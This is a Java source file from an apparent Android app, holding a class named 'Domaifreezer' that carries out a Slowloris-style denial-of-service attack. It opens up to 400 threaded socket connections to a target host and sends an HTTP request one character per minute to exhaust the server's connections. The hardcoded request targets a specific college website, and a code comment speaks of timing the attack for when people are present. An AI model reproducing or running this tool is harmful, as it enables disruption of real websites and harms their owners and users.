package com.example.nabhiraj.airavat;

import android.util.Log;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * Created by nabhiraj on 3/5/2017.
 */

public class Domaifreezer {
    static int numberofthreads=0;
    static  int numberofsockets=0;
    volatile  static boolean attackflag=true;
    static int datad = 0;
    static int portno;
    static String ip = null;
    static String data = "GET College/Home.aspx?institute=1 HTTP/1.1\r\n";
    static String datapost = "Host: www.stxaviersbhopal.org/\r\n\r\n";
    static  Thread[] attackingthreads=new Thread[400];
    static void attack(){
        nanu:for(int i=0;i<400;i++){
            if(!attackflag)break nanu;
            attackingthreads[i]=new Thread(new Runnable() {
                @Override
                public void run() {
                    numberofthreads++;
                    try {
                        Socket s= null;
                        //some people may be present at the time we will attack.
                        power:for(int j=0;j<1;j++) {
                            try {
                                s = new Socket(ip, portno);
                                numberofsockets++;
                                if(!attackflag)break power;
                            } catch (IOException e) {
                                j--;
                                Log.d("nanu","all sockets already occupied");
                                if(!attackflag)break power;
                                continue power;
                                //e.printStackTrace();
                            }
                        }
                        OutputStream output = null;
                        try {
                            output = s.getOutputStream();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        PrintWriter ps=new PrintWriter(output);
                        nabhi:for(int i=0;i<data.length();i++){
                            if(!attackflag)break nabhi;
                            Thread.sleep(1000*60);
                            ps.print(data.charAt(i));
                        }
                        ps.print(datapost);
                        ps.flush();
                        ps.close();
                        try {
                            output.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            s.close();
                            numberofsockets--;
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        datad--;
                    }  catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    numberofthreads--;
                }
            });
            attackingthreads[i].start();
        }
    }
}